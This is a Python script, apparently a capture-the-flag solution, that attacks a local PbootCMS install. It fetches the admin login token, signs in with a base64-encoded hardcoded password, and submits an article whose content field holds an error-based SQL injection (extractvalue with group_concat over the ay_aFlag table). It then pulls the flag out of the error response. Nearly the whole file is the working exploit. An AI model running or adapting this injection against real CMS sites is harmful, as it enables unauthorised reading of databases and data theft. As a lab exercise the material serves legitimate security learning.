import re
import base64
import requests
from bs4 import BeautifulSoup

##base64解码
def b64decode(str):   
    decode = base64.b64decode(str)
    return decode

def GetFormCheck():
    r = requests.get("http://127.0.0.1/admin.php")
    r.encoding = 'utf-8'
    soup = BeautifulSoup(r.text, "html.parser")
    formcheck = soup.find("input", {"name": "formcheck"})['value']
    PbootSystem = r.cookies['PbootSystem']
    return formcheck, PbootSystem


def GetCookies():
    formcheck = GetFormCheck()
    password = b64decode("MTJAYWE0Li8oOUViOUFEKTApNw==")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/71.0.3578.98 Safari/537.36',
        'Cookie': 'PbootSystem=' + formcheck[1]
    }
    url = 'http://127.0.0.1/admin.php?p=/Index/login'
    data = {
        'username': 'check',
        'password': password,
        'formcheck': formcheck[0]
    }
    r = requests.post(url, data, headers=headers)
    cookies = r.cookies['PbootSystem']
    return 'PbootSystem='+cookies


def SentExp():
    cookie = GetCookies()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/71.0.3578.98 Safari/537.36',
        'Cookie': cookie
    }
    r = requests.get("http://localhost/admin.php?p=/Content/index/mcode/2", headers=headers)
    r.encoding = 'utf-8'
    soup = BeautifulSoup(r.text, "html.parser")
    formcheck = soup.find("input", {"name": "formcheck"})['value']
    url = 'http://127.0.0.1/admin.php?p=/Content/add/mcode/2'
    data = {
            "formcheck": formcheck,
            "scode": "3",
            "title": "checktest",
            "tags": "",
            "author": "check",
            "source": "%E6%9C%AC%E7%AB%99",
            "ico": "",
            "upload": "",
            "pics": "",
            "upload": "",
            "subscode": "",
            "titlecolor": "%23333333",
            "subtitle": "",
            "filename": "",
            "outlink": "",
            "date": "2022-07-18+11%3A33%3A26",
            "enclosure": "",
            "upload": "",
            "keywords": "",
            "description": "",
            "status": "1",
            "content": '''testPOC' or (select extractvalue(1,concat(0x7e,(select group_concat(flag,0x7e) from 
            pbootcms.ay_aFlag)))) or ' '''
    }
    r = requests.post(url, data, headers=headers)
    return r.text

def GetFlag():
    flag_text = re.findall(r'flag{(.+?)}', SentExp())
    return "flag{"+flag_text[0]+"}"

if __name__ == '__main__':
    print(GetFlag())